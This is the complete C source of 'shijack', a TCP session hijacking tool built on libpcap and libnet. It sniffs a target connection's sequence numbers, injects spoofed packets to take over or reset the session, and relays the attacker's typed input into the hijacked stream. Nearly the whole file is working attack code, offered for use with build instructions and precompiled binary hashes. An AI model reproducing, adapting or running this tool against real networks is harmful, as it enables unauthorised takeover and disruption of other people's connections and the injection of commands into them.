/*
 * Full TCP connection hijacker (local, and on subnets), Uses libnet/libpcap
 * for better OS portability.
 * 
 * Written by spwny,  Inspiration by cyclozine.
 * 
 * If you dont feel like installing libnet, just use the precompiled static binaries included.
 * gcc -o shijack shijack.c -lpcap `libnet-config --libs --defines --cflags`
 * 
 * MD5 (shijack-sunsparc) = 5bf1c084811ab07f851c94c212024f07 (Sun Sparc 2.7)
 * MD5 (shijack-fbsd)     = de60e9805ee99b22c23946606078e832 (FreeBSD 4.2)
 * MD5 (shijack-lnx)      = 87418448d47d68eb819436f38aae4df2 (Slackware 7.0)
 * 
 * 
 * Changes:
 *   - Added a function to get the SEQ/ACK, instead of using a program.
 *   - Started using libpcap and libnet for better portability, instead of just raw sockets.
 *   - Added -r, Reset the connection rather than hijacking it.
 *
 * If you need any help, or wish to discuss anything about this program,
 * You can contact me on EFnet or by email, yberm@home.com.
 *     - spwny.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <unistd.h>

#define lrandom(min, max) (random()%(max-min)+min)

struct seqack {
	u_long          seq;
	u_long          ack;
};

void
devsrandom(void)
{
	int             fd;
	u_long          seed;

	fd = open("/dev/urandom", O_RDONLY);
	if (fd == -1) {
		fd = open("/dev/random", O_RDONLY);
		if (fd == -1) {
			struct timeval  tv;

			gettimeofday(&tv, NULL);
			srandom((tv.tv_sec ^ tv.tv_usec) * tv.tv_sec * tv.tv_usec ^ tv.tv_sec);
			return;
		}
	}
	read(fd, &seed, sizeof(seed));
	close(fd);
	srandom(seed);
}

void
	getseqack(char *interface, u_long srcip, u_long dstip, u_long sport, u_long dport, struct seqack *sa){
		pcap_t         *pt;
		char            ebuf[PCAP_ERRBUF_SIZE];
		u_char         *buf;
		struct ip       iph;
		struct tcphdr   tcph;
		int             ethrhdr;


		                pt = pcap_open_live(interface, 65535, 1, 60, ebuf);
		if              (!pt)
{
printf("pcap_open_live: %s\n", ebuf);
exit(-1);
}
		switch          (pcap_datalink(pt)) {
			case DLT_EN10MB:
			case DLT_EN3MB:
			ethrhdr = 14;
			break;
		case DLT_FDDI:
			ethrhdr = 21;
			break;
		case DLT_SLIP:
			ethrhdr = 16;
			break;
		case DLT_NULL:
		case DLT_PPP:
			ethrhdr = 4;
			break;
		case DLT_RAW:
			ethrhdr = 0;
		default:
			printf("pcap_datalink: Can't figure out how big the ethernet header is.\n");
			exit(-1);
		}

		printf("Waiting for SEQ/ACK  to arrive from the srcip to the dstip.\n");
		printf("(To speed things up, try making some traffic between the two, /msg person asdf\n\n");


		for (;;) {
			struct pcap_pkthdr pkthdr;

			buf = (u_char *) pcap_next(pt, &pkthdr);
			if (!buf)
				continue;
			memcpy(&iph, buf + ethrhdr, sizeof(iph));
			if (iph.ip_p != IPPROTO_TCP)
				continue;
			if ((iph.ip_src.s_addr != srcip) || (iph.ip_dst.s_addr != dstip))
				continue;
			memcpy(&tcph, buf + ethrhdr + sizeof(iph), sizeof(tcph));
			if ((tcph.th_sport != htons(sport)) || (tcph.th_dport != htons(dport)))
				continue;
			if (!(tcph.th_flags & TH_ACK))
				continue;
			printf("Got packet! SEQ = 0x%lx ACK = 0x%lx\n", htonl(tcph.th_seq), htonl(tcph.th_ack));
			sa->seq = htonl(tcph.th_seq);
			sa->ack = htonl(tcph.th_ack);
			pcap_close(pt);
			return;
		}
	}


void
sendtcp(u_long srcip, u_long dstip, u_long sport, u_long dport, u_char flags, u_long seq, u_long ack, char *data, int datalen)
{
	u_char         *packet;
	int             fd, psize;

	devsrandom();
	psize = LIBNET_IP_H + LIBNET_TCP_H + datalen;
	libnet_init_packet(psize, &packet);
	if (!packet)
		libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");
	fd = libnet_open_raw_sock(IPPROTO_RAW);
	if (fd == -1)
		libnet_error(LIBNET_ERR_FATAL, "libnet_open_raw_sock failed\n");

	libnet_build_ip(LIBNET_TCP_H + datalen, 0, random(), 0, lrandom(128, 255), IPPROTO_TCP, srcip, dstip, NULL, 0, packet);
	libnet_build_tcp(sport, dport, seq, ack, flags, 65535, 0, (u_char *) data, datalen, packet + LIBNET_IP_H);

	if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H + datalen) == -1)
		libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed\n");
	libnet_write_ip(fd, packet, psize);
	libnet_close_raw_sock(fd);
	libnet_destroy_packet(&packet);
}

struct seqack   sa;
u_long          srcip, dstip, sport, dport;

void
sighandle(int sig)
{
	printf("Closing connection..\n");
	sendtcp(srcip, dstip, sport, dport, TH_RST, sa.seq, 0, NULL, 0);
	printf("Done, Exiting.\n");
	exit(0);
}

int
main(int argc, char *argv[])
{
	char           *ifa = argv[1];
	char            buf[4096];
	int		reset = 0;
	signal(SIGTERM, sighandle);
	signal(SIGINT, sighandle);

	if (argc < 6) {
		printf("Usage: %s <interface> <src ip> <src port> <dst ip> <dst port> [-r]\n", argv[0]);
		printf("<interface>\t\tThe interface you are going to hijack on.\n");
		printf("<src ip>\t\tThe source ip of the connection.\n");
		printf("<src port>\t\tThe source port of the connection.\n");
		printf("<dst ip>\t\tThe destination IP of the connection.\n");
		printf("<dst port>\t\tThe destination port of the connection.\n");
		printf("[-r]\t\t\tReset the connection rather than hijacking it.\n");
		printf("\nCoded by spwny, Inspiration by cyclozine (http://www.geocities.com/stasikous).\n");
		exit(-1);
	}

if (argv[6] && !strcmp(argv[6], "-r") )
	reset = 1;

	srcip = inet_addr(argv[2]);
	dstip = inet_addr(argv[4]);
	sport = atol(argv[3]);
	dport = atol(argv[5]);

	if (!srcip) {
		printf("%s is not a valid ip.\n", argv[2]);
		exit(-1);
	}
	if (!dstip) {
		printf("%s is not a valid ip.\n", argv[4]);
		exit(-1);
	}
	if ((sport > 65535) || (dport > 65535) || (sport < 1) || (dport < 1)) {
		printf("The valid TCP port range is 1-1024.\n");
		exit(-1);
	}
	getseqack(ifa, srcip, dstip, sport, dport, &sa);

if (reset) {
	sendtcp(srcip, dstip, sport, dport, TH_RST, sa.seq, 0, NULL, 0);
	printf("\nConnection has been reset.\n");
	return 0;
	}

	/*
	 * Sending 1024 of zero bytes so the real owner of the TCP connection
	 * wont be able to get us out of sync with the SEQ.
	 */
	memset(&buf, 0, sizeof(buf));
	sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, 1024);
	sa.seq += 1024;

	printf("Starting hijack session, Please use ^C to terminate.\n");
	printf("Anything you enter from now on is sent to the hijacked TCP connection.\n");

	while (fgets(buf, sizeof(buf) - 1, stdin)) {
		sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, strlen(buf));
		sa.seq += strlen(buf);
		memset(&buf, 0, sizeof(buf));
	}
	sendtcp(srcip, dstip, sport, dport, TH_ACK | TH_FIN, sa.seq, sa.ack, NULL, 0);
	printf("Exiting..\n");
	return (0);
}

/* spwny @ EFnet  *
 * yberm@home.com */
